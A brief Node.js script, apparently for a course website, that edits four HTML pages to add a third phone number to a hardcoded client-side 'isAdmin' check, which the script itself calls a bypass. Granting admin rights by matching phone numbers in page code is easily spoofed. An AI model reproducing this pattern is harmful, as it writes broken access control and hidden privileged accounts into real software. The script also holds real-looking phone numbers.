const fs = require('fs');
const files = ['homeworks.html', 'exams.html', 'my-courses.html', 'stats.html'];
files.forEach(f => {
    try {
        let c = fs.readFileSync(f, 'utf8');
        if (c.includes("user.phone === '01099616091'")) {
            console.log(f, 'contains bypass');
            c = c.replace(
                /const isAdmin = \(user\.phone === '0000' \|\| user\.phone === '01099616091'\);/g,
                "const isAdmin = (user.phone === '0000' || user.phone === '01099616091' || user.phone === '01023675235');"
            );
            fs.writeFileSync(f, c, 'utf8');
        }
    } catch(e) {}
});
